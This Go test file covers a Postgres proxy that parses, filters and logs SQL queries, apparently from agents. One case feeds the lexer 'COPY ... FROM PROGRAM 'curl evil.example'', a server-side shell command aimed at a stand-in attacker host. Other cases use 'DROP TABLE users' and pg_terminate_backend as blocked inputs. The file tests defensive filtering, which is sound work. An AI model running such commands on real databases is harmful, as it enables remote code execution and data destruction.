package endpoints

import (
	"bytes"
	"context"
	"io"
	"net"
	"testing"
	"time"

	"github.com/google/go-cmp/cmp"

	"github.com/denoland/clawpatrol/config"
	"github.com/denoland/clawpatrol/config/runtime"
)

// TestParseSQL exercises the best-effort lexer that feeds the SQL
// matcher. Coverage focuses on the v14 use cases — banned verbs,
// secret-table reads, banned function calls.
func TestParseSQL(t *testing.T) {
	cases := []struct {
		name string
		sql  string
		want pgInfo
	}{
		{
			"simple select",
			"SELECT id FROM users",
			pgInfo{
				Verb:      "select",
				Tables:    []string{"users"},
				Functions: nil,
				Statement: "SELECT id FROM users",
			},
		},
		{
			"select with multiple tables (join)",
			"SELECT u.id FROM users u JOIN tokens t ON t.user_id = u.id",
			pgInfo{
				Verb:      "select",
				Tables:    []string{"users", "tokens"},
				Functions: nil,
				Statement: "SELECT u.id FROM users u JOIN tokens t ON t.user_id = u.id",
			},
		},
		{
			// Regex-based extraction is overgreedy by design: it
			// flags every `<ident>(` callsite, which includes the
			// table-name + parens (audit (...)) and SQL keywords
			// like values(. The matcher consumes a list — banned-
			// function rules check whether their target is anywhere
			// in the list, so noise is harmless. Caveat: a SQL
			// parser would be more precise; accepted trade-off.
			"insert with function",
			"INSERT INTO audit (ts, what) VALUES (now(), 'x')",
			pgInfo{
				Verb:      "insert",
				Tables:    []string{"audit"},
				Functions: []string{"audit", "values", "now"},
				Statement: "INSERT INTO audit (ts, what) VALUES (now(), 'x')",
			},
		},
		{
			"banned function (pg_terminate_backend)",
			"SELECT pg_terminate_backend(123)",
			pgInfo{
				Verb:      "select",
				Tables:    nil,
				Functions: []string{"pg_terminate_backend"},
				Statement: "SELECT pg_terminate_backend(123)",
			},
		},
		{
			// `FROM PROGRAM 'curl ...'` extracts "program" as a
			// table — also overgreedy and harmless for v14's
			// `statement = "*COPY*FROM PROGRAM*"` glob, which
			// matches the raw statement directly.
			"COPY ... FROM PROGRAM",
			"COPY foo FROM PROGRAM 'curl evil.example'",
			pgInfo{
				Verb:      "copy",
				Tables:    []string{"program"},
				Functions: nil,
				Statement: "COPY foo FROM PROGRAM 'curl evil.example'",
			},
		},
		{
			"empty sql returns empty info",
			"",
			pgInfo{},
		},
		{
			"multi-statement keeps raw statement and first verb",
			"SELECT * FROM users; DELETE FROM sessions",
			pgInfo{
				Verb:      "select",
				Tables:    []string{"users", "sessions"},
				Functions: nil,
				Statement: "SELECT * FROM users; DELETE FROM sessions",
			},
		},
		{
			"schema-qualified table",
			"SELECT * FROM audit.secret_tokens",
			pgInfo{
				Verb:      "select",
				Tables:    []string{"audit.secret_tokens"},
				Functions: nil,
				Statement: "SELECT * FROM audit.secret_tokens",
			},
		},
		{
			"quoted identifier is best-effort only",
			"SELECT * FROM \"Sensitive Table\"",
			pgInfo{
				Verb:      "select",
				Tables:    nil,
				Functions: nil,
				Statement: "SELECT * FROM \"Sensitive Table\"",
			},
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := parseSQL(tc.sql)
			if diff := cmp.Diff(tc.want, got); diff != "" {
				t.Errorf("parseSQL mismatch (-want +got):\n%s", diff)
			}
		})
	}
}

// TestPgMessageFraming round-trips a Q message through readPgMessage
// + serializePgMessage to confirm the wire-protocol framing matches
// what the upstream postgres expects.
func TestPgMessageFraming(t *testing.T) {
	original := pgMessage{typ: 'Q', payload: []byte("SELECT 1\x00")}
	wire := serializePgMessage(original)

	parsed, rest, ok := readPgMessage(wire)
	if !ok {
		t.Fatalf("readPgMessage returned ok=false on round-trip")
	}
	if len(rest) != 0 {
		t.Errorf("expected empty rest, got %d bytes", len(rest))
	}
	if parsed.typ != original.typ {
		t.Errorf("typ=%c want %c", parsed.typ, original.typ)
	}
	if string(parsed.payload) != string(original.payload) {
		t.Errorf("payload=%q want %q", parsed.payload, original.payload)
	}
}

func TestPgMessageFramingRejectsIncompleteOrMalformedPackets(t *testing.T) {
	cases := []struct {
		name string
		wire []byte
	}{
		{name: "partial header", wire: []byte{'Q', 0, 0}},
		{name: "invalid length below minimum", wire: []byte{'Q', 0, 0, 0, 3}},
		{name: "declared payload not fully buffered", wire: []byte{'Q', 0, 0, 0, 9, 'S', 'E'}},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			_, rest, ok := readPgMessage(tc.wire)
			if ok {
				t.Fatalf("readPgMessage(%v) returned ok=true", tc.wire)
			}
			if string(rest) != string(tc.wire) {
				t.Fatalf("readPgMessage should preserve buffered bytes; got %v want %v", rest, tc.wire)
			}
		})
	}
}

// TestPgExtractSQL confirms the SQL pulled out of Q (terminated
// string) and P (stmt-name \0 query \0) matches the legacy extractor.
func TestPgExtractSQL(t *testing.T) {
	if got := pgExtractSQL('Q', []byte("SELECT 1\x00")); got != "SELECT 1" {
		t.Errorf("Q extract: %q", got)
	}
	if got := pgExtractSQL('P', []byte("stmt1\x00SELECT $1\x00\x00\x00")); got != "SELECT $1" {
		t.Errorf("P extract: %q", got)
	}
	if got := pgExtractSQL('B', []byte("ignored")); got != "" {
		t.Errorf("non-Q/P extract should return empty, got %q", got)
	}
}

func TestPgClientToServerForwardsQueryMessage(t *testing.T) {
	agent, gateway, upstream, upstreamPeer, cleanup := pgPumpTestPipes(t)
	defer cleanup()

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	go pgClientToServer(ctx, &runtime.ConnHandle{Conn: gateway}, upstream, "")

	wire := serializePgMessage(pgMessage{typ: 'Q', payload: []byte("SELECT 1\x00")})
	go func() { _, _ = agent.Write(wire) }()

	got := readFullWithDeadline(t, upstreamPeer, len(wire))
	if !bytes.Equal(got, wire) {
		t.Fatalf("forwarded bytes = %v, want %v", got, wire)
	}
}

func TestPgClientToServerDeniesQueryMessage(t *testing.T) {
	agent, gateway, upstream, upstreamPeer, cleanup := pgPumpTestPipes(t)
	defer cleanup()

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	ch := &runtime.ConnHandle{
		Conn: gateway,
		Endpoint: &config.CompiledEndpoint{Rules: []*config.CompiledRule{{
			Outcome: config.Outcome{Verdict: "deny", Reason: "blocked"},
		}}},
	}
	go pgClientToServer(ctx, ch, upstream, "")

	wire := serializePgMessage(pgMessage{typ: 'Q', payload: []byte("DROP TABLE users\x00")})
	go func() { _, _ = agent.Write(wire) }()
	_ = readFullWithDeadline(t, agent, 5) // ErrorResponse header; unblocks pgWriteDeny.

	_ = upstreamPeer.SetReadDeadline(time.Now().Add(50 * time.Millisecond))
	buf := make([]byte, 1)
	if n, err := upstreamPeer.Read(buf); err == nil || n != 0 {
		t.Fatalf("upstream received denied query bytes: n=%d err=%v", n, err)
	}
}

func TestPgClientToServerForwardsNonInspectedMessage(t *testing.T) {
	agent, gateway, upstream, upstreamPeer, cleanup := pgPumpTestPipes(t)
	defer cleanup()

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	go pgClientToServer(ctx, &runtime.ConnHandle{Conn: gateway}, upstream, "")

	wire := serializePgMessage(pgMessage{typ: 'B', payload: []byte("portal\x00stmt\x00\x00\x00")})
	go func() { _, _ = agent.Write(wire) }()

	got := readFullWithDeadline(t, upstreamPeer, len(wire))
	if !bytes.Equal(got, wire) {
		t.Fatalf("forwarded bytes = %v, want %v", got, wire)
	}
}

func TestPgClientToServerForwardsPartialFrame(t *testing.T) {
	agent, gateway, upstream, upstreamPeer, cleanup := pgPumpTestPipes(t)
	defer cleanup()

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	go pgClientToServer(ctx, &runtime.ConnHandle{Conn: gateway}, upstream, "")

	wire := serializePgMessage(pgMessage{typ: 'Q', payload: []byte("SELECT 1\x00")})
	go func() {
		_, _ = agent.Write(wire[:3])
		time.Sleep(10 * time.Millisecond)
		_, _ = agent.Write(wire[3:])
	}()

	got := readFullWithDeadline(t, upstreamPeer, len(wire))
	if !bytes.Equal(got, wire) {
		t.Fatalf("forwarded bytes = %v, want %v", got, wire)
	}
}

func TestPgClientToServerForwardsMultipleFramesFromOneRead(t *testing.T) {
	agent, gateway, upstream, upstreamPeer, cleanup := pgPumpTestPipes(t)
	defer cleanup()

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	go pgClientToServer(ctx, &runtime.ConnHandle{Conn: gateway}, upstream, "")

	q := serializePgMessage(pgMessage{typ: 'Q', payload: []byte("SELECT 1\x00")})
	syncMsg := serializePgMessage(pgMessage{typ: 'S'})
	wire := append(append([]byte{}, q...), syncMsg...)
	go func() { _, _ = agent.Write(wire) }()

	got := readFullWithDeadline(t, upstreamPeer, len(wire))
	if !bytes.Equal(got, wire) {
		t.Fatalf("forwarded bytes = %v, want %v", got, wire)
	}
}

func pgPumpTestPipes(t *testing.T) (agent, gateway, upstream, upstreamPeer net.Conn, cleanup func()) {
	t.Helper()
	agent, gateway = net.Pipe()
	upstream, upstreamPeer = net.Pipe()
	cleanup = func() {
		_ = agent.Close()
		_ = gateway.Close()
		_ = upstream.Close()
		_ = upstreamPeer.Close()
	}
	return agent, gateway, upstream, upstreamPeer, cleanup
}

func readFullWithDeadline(t *testing.T, c net.Conn, n int) []byte {
	t.Helper()
	_ = c.SetReadDeadline(time.Now().Add(time.Second))
	buf := make([]byte, n)
	if _, err := io.ReadFull(c, buf); err != nil {
		t.Fatalf("read %d bytes: %v", n, err)
	}
	return buf
}

func TestPgClientToServerReturnsOnContextCancel(t *testing.T) {
	agent, gateway := net.Pipe()
	defer func() { _ = agent.Close() }()
	upstream, upstreamPeer := net.Pipe()
	defer func() { _ = upstream.Close() }()
	defer func() { _ = upstreamPeer.Close() }()

	ctx, cancel := context.WithCancel(context.Background())
	done := make(chan struct{})
	go func() {
		defer close(done)
		pgClientToServer(ctx, &runtime.ConnHandle{Conn: gateway}, upstream, "")
	}()

	cancel()
	select {
	case <-done:
	case <-time.After(time.Second):
		t.Fatal("pgClientToServer did not return after context cancellation")
	}
}

// TestPgEvaluateEmitsAllowOnNoMatch nails down the dashboard logging
// fix: an endpoint with zero rules (or one whose rules don't match
// the current query) still emits an `allow` event so the query
// shows up in the actions tab. Without this, postgres connections
// to permissive endpoints were invisible to operators — the runtime
// previously short-circuited on `cr == nil`.
func TestPgEvaluateEmitsAllowOnNoMatch(t *testing.T) {
	var events []runtime.ConnEvent
	ch := &runtime.ConnHandle{
		Endpoint: &config.CompiledEndpoint{
			Name:   "pg-test",
			Family: "sql",
			// Rules is nil — no rule will fire.
		},
		Emit: func(ev runtime.ConnEvent) { events = append(events, ev) },
	}
	if v, _ := pgEvaluate(ch, "SELECT 1", ""); v != "" {
		t.Errorf("verdict %q, want empty (allow)", v)
	}
	if len(events) != 1 {
		t.Fatalf("got %d events, want 1: %+v", len(events), events)
	}
	if events[0].Action != "allow" {
		t.Errorf("Action = %q, want allow", events[0].Action)
	}
	if events[0].Verb != "select" {
		t.Errorf("Verb = %q, want select", events[0].Verb)
	}
}
